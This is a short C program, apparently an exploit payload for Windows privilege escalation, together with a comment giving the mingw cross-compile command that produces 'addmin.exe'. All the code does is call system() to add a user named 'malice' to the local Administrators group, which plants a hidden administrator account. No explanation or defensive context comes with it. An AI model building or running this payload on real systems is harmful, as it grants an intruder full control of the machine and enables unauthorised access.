  #include <stdlib.h>
  int main ()
  {
    int i;
    i = system("net localgroup administrators malice /add");
    return 0;
   }
   
   /* i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o addmin.exe */
